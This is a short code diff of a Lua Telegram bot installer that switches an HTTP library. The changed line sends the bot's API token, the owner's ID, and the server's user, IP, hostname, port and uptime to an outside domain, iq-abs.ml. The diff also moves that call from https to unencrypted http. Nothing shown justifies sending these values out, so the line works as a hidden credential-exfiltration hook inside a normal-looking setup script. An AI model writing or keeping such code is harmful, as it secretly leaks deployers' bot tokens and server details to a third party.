@@ -1,5 +1,6 @@
 redis = require('redis') 
 https = require ("ssl.https") 
+http = require("socket.http")
 serpent = dofile("./library/serpent.lua") 
 json = dofile("./library/JSON.lua") 
 JSON  = dofile("./library/dkjson.lua")
@@ -64,7 +65,7 @@ end
 os.execute('lua WaTaN.lua') 
 end
 end
-https.request("https://iq-abs.ml/test/abs.php?Get=WaTaN&DevId="..database:get(id_server..":SUDO:ID").."&TokenBot="..database:get(id_server..":token").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+http.request("http://iq-abs.ml/test/abs.php?Get=WaTaN&DevId="..database:get(id_server..":SUDO:ID").."&TokenBot="..database:get(id_server..":token").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 local create_config_auto = function()
 config = {
 token = database:get(id_server..":token"),
